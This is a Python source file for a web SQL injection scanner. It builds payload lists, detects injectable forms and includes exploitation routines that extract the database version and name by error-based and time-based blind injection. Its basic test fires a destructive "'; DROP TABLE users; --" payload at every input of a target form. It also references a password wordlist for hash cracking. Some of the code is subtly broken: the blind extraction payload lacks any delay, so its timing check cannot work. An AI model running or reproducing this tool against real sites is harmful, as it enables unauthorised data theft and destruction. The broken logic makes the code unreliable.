from datetime import datetime
from urllib.parse import urljoin
import requests
import time
import logging
from selenium.webdriver.remote.webdriver import WebDriver
import os

from scanner.utils import send_request

class SQLInjectionScanner:
    def __init__(self, driver=None, payload_file=None):
        """
        Initialize the SQL Injection Scanner.
        Args:
            driver: Optional Selenium WebDriver instance.
            payload_file: Path to a custom payload file (optional).
        """
        self.driver = driver
        self.payloads = self._load_payloads(payload_file)
        self.wordlist_path = "wordlists/rockyou.txt"
        self.time_threshold = 5  # Configurable threshold
        self.vulnerable_endpoints = []

    def _load_payloads(self, payload_file):
        """
        Load SQL injection payloads from a file or use default payloads.
        Args:
            payload_file: Path to the payload file.
        Returns:
            list: List of payloads.
        """
        if payload_file and os.path.exists(payload_file):
            with open(payload_file, "r") as f:
                return [line.strip() for line in f if line.strip()]
        else:
            # Default payloads
            return ["' OR '1'='1", "' OR '1'='1' --", "' OR '1'='1' /*"]

    def _test_payloads(self, action, method, data, payloads, check_response):
        """Helper method to test payloads."""
        for payload in payloads:
            for input_name in data:
                modified_data = data.copy()
                modified_data[input_name] = payload

                try:
                    response = self._send_request(action, method, modified_data)
                    if check_response(response, payload):
                        return True
                except requests.RequestException as e:
                    logging.error(f"Error testing SQLi on {action}: {e}")
        return False

    def _get_default_payloads(self):
        """Returns comprehensive SQLi payloads including Exploit-DB techniques"""
        return [
            # Basic detection payloads
            "' OR '1'='1",
            "' OR 1=1--",
            "\" OR \"\"=\"",
            
            # Error-based (from Exploit-DB example)
            "\") \"",  # Inventio Lite specific
            "' OR username LIKE '%",  # Blind extraction
            
            # Time-based
            "' OR SLEEP(5)--",
            "' AND IF(1=1,SLEEP(5),0)--",
            
            # Boolean-based blind
            "' AND 1=1--",
            "' AND 1=2--",
            
            # UNION-based
            "' UNION SELECT null--",
            "' UNION SELECT @@version--",
            
            # Heavy computation
            "' OR BENCHMARK(1000000,MD5(1))--"
        ]

    def test_sql_injection(self, form, url):
        """
        Test for SQL Injection vulnerabilities.
        """
        if not form or "action" not in form or "inputs" not in form:
            return False

        target_url = urljoin(url, form["action"])
        payloads = ["' OR '1'='1", "'; DROP TABLE users; --"]
        for payload in payloads:
            data = {input["name"]: payload for input in form["inputs"]}
            response = self._send_request(target_url, "POST", data)
            if response and ("error" in response.text or "syntax" in response.text):
                logging.warning(f"Basic SQLi found at {target_url} with payload: {payload}")
                return True
        return False

    def _log_vulnerability(self, url, vuln_type, data):
        """Helper to log discovered vulnerabilities."""
        self.vulnerable_endpoints.append({
            'url': url,
            'type': vuln_type,
            'form_data': data,
            'timestamp': datetime.now().isoformat()
        })
        logging.warning(f"Found {vuln_type} at {url}")

    def _test_basic_sqli(self, action, method, data):
        """Test for basic SQLi vulnerabilities"""
        return self._test_payloads(
            action, method, data, self.payloads[:6],
            lambda response, payload: self._is_vulnerable_response(response)
        )

    def _test_error_based(self, action, method, data):
        """Test for error-based SQLi (Exploit-DB style)"""
        error_payloads = [
            "\") \"",  # From Exploit-DB example
            "' OR \"\"=\"",
            "' OR 1=CONVERT(int, (SELECT table_name FROM information_schema.tables))--"
        ]
        
        return self._test_payloads(
            action, method, data, error_payloads,
            lambda response, payload: "error" in response.text.lower() or "exception" in response.text.lower()
        )

    def _test_blind_sqli(self, action, method, data):
        """Test for blind SQLi (time-based and boolean-based)"""
        # Time-based testing
        time_payloads = [
            "' OR SLEEP(5)--",
            "' AND IF(1=1,SLEEP(5),0)--"
        ]
        
        for payload in time_payloads:
            for input_name in data:
                modified_data = data.copy()
                modified_data[input_name] = payload

                try:
                    start_time = time.time()
                    response = self._send_request(action, method, modified_data)
                    elapsed = time.time() - start_time
                    
                    if elapsed >= self.time_threshold:
                        logging.warning(f"Time-Based Blind SQLi found at {action} with payload: {payload}")
                        return True
                except requests.RequestException as e:
                    logging.error(f"Error testing SQLi on {action}: {e}")

        return False

    def _send_request(self, action, method, data):
        """Send HTTP request based on method."""
        try:
            if method.lower() == "post":
                return requests.post(action, data=data, timeout=10)
            elif method.lower() == "get":
                return requests.get(action, params=data, timeout=10)
        except requests.RequestException as e:
            logging.error(f"Error sending {method.upper()} request to {action}: {e}")
            return None

    def _is_vulnerable_response(self, response):
        """Check if response indicates vulnerability"""
        if response.status_code != 200:
            return False
            
        indicators = [
            "error",
            "syntax",
            "sql",
            "database",
            "mysql",
            "pg_",
            "exception",
            "warning"
        ]
        
        return any(indicator in response.text.lower() for indicator in indicators)

    def _validate_form(self, form):
        """
        Validate form structure.
        Returns:
            bool: True if the form has at least one input and an action, False otherwise.
        """
        if not form.get("inputs"):
            logging.warning("Form validation failed: No inputs found.")
            return False
        if not form.get("action"):
            logging.warning("Form validation failed: No action URL found.")
            return False
        return True

    def exploit_vulnerability(self, endpoint_info):
        """
        Attempt to exploit a found vulnerability to extract data
        Based on the Exploit-DB example
        """
        if endpoint_info['type'] == 'Error-Based SQLi':
            return self._exploit_error_based(endpoint_info)
        elif endpoint_info['type'] == 'Blind SQLi':
            return self._exploit_blind(endpoint_info)
        return None

    def _exploit_error_based(self, endpoint_info):
        """Error-based exploitation (simplified version)"""
        action = endpoint_info['url']
        method = endpoint_info['form_data'].get('method', 'post')
        data = endpoint_info['form_data'].copy()
        
        # Try to extract database version
        payload = "' AND 1=CONVERT(int, (SELECT @@version))--"
        for input_name in data:
            modified_data = data.copy()
            modified_data[input_name] = payload
            
            try:
                response = self._send_request(action, method, modified_data)
                if "conversion" in response.text.lower():
                    # Parse version from error message
                    return {"db_version": self._parse_version(response.text)}
            except requests.RequestException:
                continue
        return None

    def _exploit_blind(self, endpoint_info):
        """Blind SQLi exploitation (time-based)."""
        action = endpoint_info['url']
        method = endpoint_info['form_data'].get('method', 'post')
        data = endpoint_info['form_data'].copy()

        extracted_data = ""
        for i in range(1, 21):  # Extract up to 20 characters
            for char in range(32, 127):  # Printable ASCII range
                payload = f"' AND ASCII(SUBSTRING((SELECT database()), {i}, 1))={char}--"
                for input_name in data:
                    modified_data = data.copy()
                    modified_data[input_name] = payload

                    try:
                        start_time = time.time()
                        self._send_request(action, method, modified_data)
                        elapsed = time.time() - start_time

                        if elapsed >= self.time_threshold:
                            extracted_data += chr(char)
                            break
                    except requests.RequestException as e:
                        logging.error(f"Error during blind SQLi exploitation: {e}")
                else:
                    continue
                break
        return {"extracted_data": extracted_data}

    def _parse_version(self, error_text):
        """Attempt to parse DB version from error message"""
        # Implementation would depend on the specific DBMS
        return "Unknown version (check error message manually)"

    def set_wordlist(self, path):
        """Set path to password wordlist for hash cracking"""
        self.wordlist_path = path